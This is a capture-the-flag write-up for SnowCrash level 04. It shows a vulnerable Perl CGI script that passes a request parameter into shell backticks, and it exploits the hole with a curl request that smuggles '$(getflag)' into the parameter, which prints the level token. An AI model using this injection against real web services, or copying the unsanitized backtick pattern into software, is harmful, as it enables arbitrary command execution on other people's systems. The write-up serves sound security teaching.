# 🔐 Level 04

> **Category:** Web Exploitation  
> **Difficulty:** ⭐⭐☆☆☆  
> **Key Technique:** Command Injection via CGI

---

## 📋 Overview

A Perl CGI script running on a local web server is vulnerable to command injection through unsanitized user input.

---

## 🔍 Reconnaissance

### Examining the Script

```bash
level04@SnowCrash:~$ cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

---

## 💡 Vulnerability Analysis

The script takes a parameter `x` and passes it directly to a shell command:

```perl
print `echo $y 2>&1`;
```

> [!CAUTION]
> **Command Injection!** The backticks execute the string as a shell command. User input is not sanitized, allowing arbitrary command execution.

---

## 🎯 Exploitation

### Injecting Commands via HTTP

We use command substitution `$(...)` to inject our payload:

```bash
level04@SnowCrash:~$ curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `ne2searoevaevoem4ov4ar8ap` |

---

## 📚 References

- [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)
- [CGI Security](https://www.cgisecurity.com/)